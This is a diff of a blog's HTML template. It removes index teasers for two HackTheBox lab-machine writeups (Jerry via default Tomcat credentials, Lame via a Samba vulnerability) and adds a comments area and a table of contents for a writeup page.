-                  <a href="/category/#/Writeup" itemprop="url" rel="index">
-                    <span itemprop="name">Writeup</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/Machine" itemprop="url" rel="index">
-                    <span itemprop="name">Machine</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <div class="post-thumbnail text-center">
-          <a><img src="/assets/images/Jerry/info.png" width="400" align="center"/></a>
-          </div>
-          
-  A retired windows box from HackTheBox, owned by abusing default password in Apache Tomcat installation and deploying a war package.
-
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/12/03/HTB_Jerry_Writeup/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-        
-        
-        
-        
-          <div class="post-eof"></div>
-        
-      
-    </footer>
-  </article>
-
-  
-    
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://localhost:4000/2020/12/02/HTB_Lame_Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="b4bygroot">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/assets/images/author.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="b4bygroot">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-          
-          
-            
-                
-                <a class="post-title-link" href="/2020/12/02/HTB_Lame_Writeup/" itemprop="url">
-                Lame Machine Writeup- HackTheBox
-              </a>
-            
-          
-        </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-02T16:00:00+05:30">
-                2020-12-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/HTB" itemprop="url" rel="index">
-                    <span itemprop="name">HTB</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/Writeup" itemprop="url" rel="index">
-                    <span itemprop="name">Writeup</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/Machine" itemprop="url" rel="index">
-                    <span itemprop="name">Machine</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <div class="post-thumbnail text-center">
-          <a><img src="/assets/images/Lame/info.png" width="400" align="center"/></a>
-          </div>
-          
-  A retired linux box from HackTheBox, owned by exploiting the known vulnerability on the installed Samba version.
-
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/12/02/HTB_Lame_Writeup/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-        
-        
-        
-        
-          <div class="post-eof"></div>
-        
-      
-    </footer>
-  </article>
-
-  
-</section>
-
-
-
+  </div>
+</div>
 
 
           </div>
@@ -1245,6 +813,10 @@
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -1262,10 +834,30 @@
     <div class="sidebar-inner">
 
       
+        
+        
+        
+
+
+
+
+
+
 
       
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/assets/images/author.jpeg"
@@ -1364,6 +956,34 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+            
+              <div class="post-toc-content">
+    <ol class=nav>
+      <li class="nav-item nav-level-1"> <a class="nav-link" href="#methodology"> <span class="nav-number">1</span> <span class="nav-text">Methodology</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#lessons-learned"> <span class="nav-number">2</span> <span class="nav-text">Lessons Learned</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#open-ports-enumeration"> <span class="nav-number">3</span> <span class="nav-text">Open Ports Enumeration</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#web-service-enumeration"> <span class="nav-number">4</span> <span class="nav-text">Web Service Enumeration</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#initial-foothold"> <span class="nav-number">5</span> <span class="nav-text">Initial Foothold</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#privilege-escalation"> <span class="nav-number">6</span> <span class="nav-text">Privilege Escalation</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#system-owned"> <span class="nav-number">7</span> <span class="nav-text">System Owned</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#resources"> <span class="nav-number">8</span> <span class="nav-text">Resources</span> </a> </li>
+    </ol>
+  </div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
